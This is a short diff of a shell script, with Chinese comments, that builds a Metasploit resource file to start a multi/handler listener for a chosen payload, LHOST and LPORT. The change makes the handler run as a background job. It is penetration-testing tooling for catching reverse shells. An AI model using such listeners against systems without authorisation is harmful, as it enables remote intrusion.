@@ -416,7 +416,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD $payload" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j " >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 #选择y ——》将输出的内容保存自定义的文件，并执行msf监听模块
 elif [ "$ps1" == "n" ]; then
@@ -424,7 +424,7 @@ echo "use exploit/multi/handler" >> resource/handler.rc
 echo "set PAYLOAD $payload" >> resource/handler.rc
 echo "set LHOST $ip" >>  resource/handler.rc
 echo "set LPORT $port" >>  resource/handler.rc
-echo "exploit " >>  resource/handler.rc
+echo "exploit -j " >>  resource/handler.rc
 msfconsole -r  resource/handler.rc
 fi
 #否则，（选择N后）直接执行msf监听模块
